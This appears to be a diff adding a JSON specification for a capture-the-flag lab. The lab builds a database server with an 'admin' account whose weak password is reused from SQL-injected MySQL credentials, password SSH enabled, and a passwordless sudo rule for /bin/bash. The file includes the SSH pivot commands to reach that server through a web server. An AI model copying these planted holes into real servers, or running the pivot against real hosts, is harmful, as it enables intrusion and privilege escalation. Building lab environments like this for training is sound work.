@@ -1,0 +1,15 @@
+{
+  "summary": "SSH credential reuse misconfiguration allowing pivot from web_server to db_server using credentials discovered via SQLi",
+  "runtime": "ubuntu",
+  "app_description": "",
+  "endpoints": [],
+  "vulnerability_placement": "On db_server, an OS user named 'admin' is created with password 'adminpass123' (matching the MySQL credentials discovered via SQLi). The MySQL service runs as this same 'admin' OS user. SSH is installed and running on port 22, accepting password authentication. The admin user has a weak password identical to the database credentials, enabling credential reuse. Additionally, the admin user is added to the sudo group or given limited sudo rights to simulate a low-privileged but escalatable account. The db_server is on an internal network (e.g., 172.20.0.0/16) not directly reachable from outside, but reachable from web_server. The setup script creates the user, sets the password, installs openssh-server, enables PasswordAuthentication in sshd_config, and plants a flag file at /home/admin/flag.txt and /root/flag.txt to confirm successful access.",
+  "data_model": {
+    "tables": []
+  },
+  "attack_entry_point": "# Step 1: From attacker machine, SSH into web_server as pivot\n# Step 2: From web_server, pivot to db_server using reused credentials\nssh -o StrictHostKeyChecking=no admin@db_server\n# Password: adminpass123\n# Or using single command via ProxyJump:\nssh -o StrictHostKeyChecking=no -J attacker@web_server admin@db_server\n# Once on db_server:\ncat /home/admin/flag.txt\nid\nwhoami",
+  "success_indicator": "uid=1001(admin) gid=1001(admin) groups=1001(admin),27(sudo) and contents of /home/admin/flag.txt displayed, confirming interactive shell on isolated db_server as admin user",
+  "extra_npm_packages": [],
+  "extra_pip_packages": [],
+  "notes": "Setup bash script should: (1) useradd -m -s /bin/bash admin && echo 'admin:adminpass123' | chpasswd, (2) apt-get install -y openssh-server, (3) sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config && sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config, (4) service ssh start or systemctl enable --now ssh, (5) usermod -aG sudo admin, (6) echo 'FLAG{ssh_pivot_db_server_compromised}' > /home/admin/flag.txt && chown admin:admin /home/admin/flag.txt, (7) echo 'admin ALL=(ALL) NOPASSWD: /bin/bash' >> /etc/sudoers.d/admin to allow privilege escalation demo. The db_server container should NOT expose port 22 externally in docker-compose \u2014 only internally so the pivot via web_server is required."
+}
